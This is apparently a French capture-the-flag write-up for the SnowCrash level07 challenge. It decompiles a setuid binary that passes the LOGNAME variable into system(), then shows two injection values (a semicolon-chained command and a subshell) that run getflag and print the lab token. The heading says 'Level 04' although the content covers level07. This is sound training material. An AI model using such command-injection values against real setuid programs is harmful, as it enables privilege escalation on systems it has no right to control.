
# **Level 04**

Pour le level07, nous avons un executable dans le repertoire courant

```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Quand on l'execute le programme affiche `level07` tout le temps donc on decide de le decompiler pour l'analyser

```
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}

```

On en conclue que le programme affiche le contenue de la variable d'environnement `LOGNAME`, on peux donc la remplacer pour executer `getflag`

> en executant une autre commande apres echo
```
export LOGNAME=";getflag"
```

> Avec un subshell
```
export LOGNAME=$\('getflag'\)
```

Cela nous affiche

```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

> ### NEXT : [Level 08](/level08/resources/README.md)
